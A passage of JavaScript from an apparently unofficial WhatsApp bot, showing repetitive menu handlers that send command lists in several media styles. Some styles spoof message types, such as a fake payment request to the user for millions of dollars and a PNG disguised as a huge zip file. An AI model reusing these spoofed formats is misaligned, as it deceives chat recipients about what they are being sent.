          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "groupmenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "funmenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "stalkermenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "randomphotomenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "randomvideomenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "photooxymenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${photooxymenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "ephoto360menu":
      case "ephotomenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ephoto360menu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "makermenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${makermenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "nsfwmenu":
        {
          let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(
            prefix,
            hituet
          )}`;
          if (typemenu === "v1") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid.mp4"),
                caption: xmenu_oh,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid2.mp4"),
                caption: xmenu_oh,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: xmenu_oh,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            XliconBotInc.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "USD",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: xmenu_oh,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_oh,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./XliconMedia/theme/xliconpic.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            XliconBotInc.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./XliconMedia/theme/xliconvid3.mp4"),
                gifPlayback: true,
                caption: xmenu_oh,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
